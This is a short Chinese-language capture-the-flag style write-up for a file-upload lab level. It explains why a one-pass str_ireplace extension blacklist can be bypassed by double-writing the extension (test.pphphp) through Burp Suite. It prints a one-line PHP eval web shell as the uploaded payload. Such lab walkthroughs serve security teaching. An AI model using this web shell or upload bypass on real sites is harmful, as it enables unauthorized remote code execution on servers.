## 解题wp(By:独立团孙德胜Alan)
本pass可以通过增加点的方式绕过，注意，此Pass需要修改PHP环境为5.2.17

## 1.打开第十关

![](./img/1.png)

## 2.上传一个普通的shell.php文件

```
<?php @eval($_POST('Alan'));?>
```

![](./img/2.png)

#### 我们发现，上传的时候被去掉php了

## 3.分析代码

##### ![](./img/3.png)

##### 可以看到$file_name = str_ireplace($deny_ext,"", $file_name)，直接删除黑名单中的内容。但是这个代码凶起来连文件名的内容也删，这让我想起之前看的文章说不要试图修改用户的输入，直接禁止就行。

##### 因为str_ireplace函数只使用了一次。直接使用双写绕过就行test.pphphp

## 4.我们可以使用Burpsutie抓包，双写php绕过

![](./img/4.png)

